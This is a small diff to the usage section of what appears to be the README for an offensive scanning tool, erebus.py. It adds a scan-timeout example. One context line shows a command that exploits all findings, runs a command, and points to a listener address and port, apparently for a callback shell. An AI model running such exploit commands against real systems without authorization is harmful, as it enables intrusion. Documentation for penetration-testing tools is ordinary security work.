@@ -34,6 +34,9 @@ python erebus.py --scan --target https://target.com \
 # Exploit all findings after scan
 python erebus.py --scan --target https://target.com --exploit-all \
     --command "id" --lhost 10.10.14.5 --lport 9001
+
+# Abort after 5 minutes, produce partial report
+python erebus.py --scan --target https://target.com --mode deep --scan-timeout 300
 ```
 
 ### Modules
